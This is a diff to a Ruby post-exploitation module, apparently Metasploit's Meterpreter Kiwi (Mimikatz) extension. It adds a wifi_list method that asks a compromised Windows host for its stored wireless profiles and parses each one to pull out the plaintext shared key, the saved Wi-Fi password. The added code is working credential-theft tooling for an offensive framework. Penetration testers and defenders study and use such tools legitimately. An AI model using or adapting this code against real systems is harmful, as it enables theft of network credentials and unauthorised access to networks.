@@ -1,7 +1,7 @@
 # -*- coding: binary -*-
 
 require 'rex/post/meterpreter/extensions/kiwi/tlv'
-require 'csv'
+require 'rexml/document'
 
 module Rex
 module Post
@@ -231,8 +231,48 @@ class Kiwi < Extension
     end
 
     response = client.send_request(request)
+return response.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_RAW)
+  end
 
-    return response.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_RAW)
+  #
+  # List all the wifi interfaces and the profiles associated
+  # with them. Also show the raw text passwords for each.
+  #
+  # Returns [Array[Hash]]
+  #
+  def wifi_list
+    request = Packet.create_request('kiwi_wifi_profile_list')
+
+    response = client.send_request(request)
+
+    results = []
+
+    response.each(TLV_TYPE_KIWI_WIFI_INT) do |i|
+      interface = {
+        :guid     => Rex::Text::to_guid(i.get_tlv_value(TLV_TYPE_KIWI_WIFI_INT_GUID)),
+        :desc     => i.get_tlv_value(TLV_TYPE_KIWI_WIFI_INT_DESC),
+        :state    => i.get_tlv_value(TLV_TYPE_KIWI_WIFI_INT_STATE),
+        :profiles => []
+      }
+
+      i.each(TLV_TYPE_KIWI_WIFI_PROFILE) do |p|
+
+        xml = p.get_tlv_value(TLV_TYPE_KIWI_WIFI_PROFILE_XML)
+        doc = REXML::Document.new(xml)
+        profile = doc.elements['WLANProfile']
+
+        interface[:profiles] << {
+          :name        => p.get_tlv_value(TLV_TYPE_KIWI_WIFI_PROFILE_NAME),
+          :auth        => profile.elements['MSM/security/authEncryption/authentication'].text,
+          :key_type    => profile.elements['MSM/security/sharedKey/keyType'].text,
+          :shared_key  => profile.elements['MSM/security/sharedKey/keyMaterial'].text
+        }
+      end
+
+      results << interface
+    end
+
+    return results
   end
 
   #
